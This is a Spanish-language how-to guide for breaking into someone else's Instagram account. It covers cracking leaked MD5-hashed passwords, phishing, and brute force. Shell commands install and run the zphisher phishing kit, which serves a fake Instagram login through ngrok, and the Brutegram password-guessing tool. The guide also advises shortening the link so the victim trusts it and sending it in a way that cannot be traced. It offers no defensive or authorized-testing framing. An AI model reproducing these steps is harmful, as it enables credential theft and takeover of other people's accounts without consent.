Hackear Instagram

Mirar si esta filtrada

Lo primero que haremos sera mirar si su contraseña ha sido filtrada alguna vez, para ello entraremos aqui. Una vez estemos dentro de la página lo que haremos será escribir el correo o nombre de usuario de la persona a la que queremos hackear y le damos a buscar, puede que no nos salga nada porque la contraseña no se ha filtrado o puede que nos salga la mitad de la contraseña como puede ser algo asi rasca****** y al lado algo parecido a esto 1a7ff607e84e73f99bc8eec9cba0914f que es la contraseña cifrada en md5, para descifrarla buscamos en internet un descifrador online como puede ser este, pegamos la contraseña cifrada y nos la devolverá sin cifrar, que en este caso sería rascacielos.

Phishing

Si el método anterior no funciono porque no aparecio ninguna contraseña filtrada o porque la contraseña filtrada era vieja, tendremos que probar con otro metodo. La forma más rápida de hackear una cuenta de Instagram es mediante ingeniería social, que es aprovecharse de las personas para hackearlas, con tecnicas como el phishing que es clonar una página web y hacer que la persona a la que queremos hackear piense que esta iniciando sesión en la página web real pero en vez de eso nos llegarán su usuario, contraseña, ip y nos geolocaliza a la persona. Para hacer esto necesitaremos tener en el ordenador una distro de linux como pueden ser Kali linux o Parrot os, que ya vienen con muchas herramientas orientadas a la seguridad o si tienes un teléfono android puedes descargar desde la playstore la aplicación Termux.

Cuando lo tengamos todo instalado, vamos a la terminal y ejecutamos los siguiente comandos:

[+] Installation :
root@kali:~# apt update
root@kali:~# apt install git php openssh curl -y
root@kali:~# git clone https://github.com/htr-tech/zphisher
root@kali:~# cd zphisher
root@kali:~# chmod +x zphisher.sh
root@kali:~# bash zphisher.sh

Cuando se ejecute el script nos preguntara que que página queremos crear y le daremos al 2 que es Instagram, después le daremos al 1 para poner la página tradicional y le volveremos a dar al 2 para crear el link con ngrok. Copiaremos el link y lo cambiaremos con un acortador de internet para que sea más facil que la víctima piense que es real y se lo mandaremos a la víctima de alguna forma no pueda relacionarlo contigo.

Brute force

La ultima forma de hackear Instagram sería por medio de fuerza bruta, es decir se va probando un diccionario de contraseñas automaticamente desde una terminal de linux o de termux como en el anterior. Para hacerlo vamos a la terminal y ejecutamos los siguiente comandos:
[+] Installation :
root@kali:~# apt update && apt upgrade
root@kali:~# apt install python python2 git jq
root@kali:~# pip2 install requests mechanize
root@kali:~# git clone https://github.com/Err0r-ICA/Brutegram
root@kali:~# cd Brutegram
root@kali:~# bash Brutegram

Cuando se ejecuta el script, metes el nombre de usuario y el diccionario que quieres que pruebe y si esta la contraseña en ese diccionario te lo dirá.
